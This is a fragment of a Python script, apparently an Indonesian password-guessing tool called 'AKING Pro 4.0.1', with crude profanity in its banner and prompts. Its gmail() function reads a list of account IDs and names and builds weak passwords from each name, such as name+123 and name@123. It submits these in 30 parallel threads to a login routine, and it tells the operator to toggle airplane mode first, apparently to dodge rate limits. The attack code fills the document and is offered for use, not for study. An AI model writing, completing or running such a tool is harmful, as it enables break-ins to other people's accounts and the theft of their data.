...
----------------------------------------------
 ...
 Version   : 4.0.1
----------------------------------------------
 AKING Pro version 4.0.1
 For Haters: Script kalian yang paling bagus ANJING 🤞
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def gmail():
                ...
                clear()
                print('\033[1;37m example: goblog, asu, idiot\033[1;97m')
                linex()
                first = input(' Put first name: ')
                linex()
                print('\033[1;37m example: kontol, bapak, kau \033[1;97m')
                linex()
                ...
                with tred(max_workers=30) as Aking:
                        ...
                        print("\033[1;37m \x1b[38;5;208mTERBANGKAN PESWATMU SEBELUM MENJALANKAN\033[1;37m")
                        linex()
                        for user in fo:
                                ids,names = user.split('|')
                                ...
                                fs = first_name.lower()
                                ls = last_name.lower()
                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'21',fs,fs+'1234',fs+'@123',fs+'12']
                                Aking.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
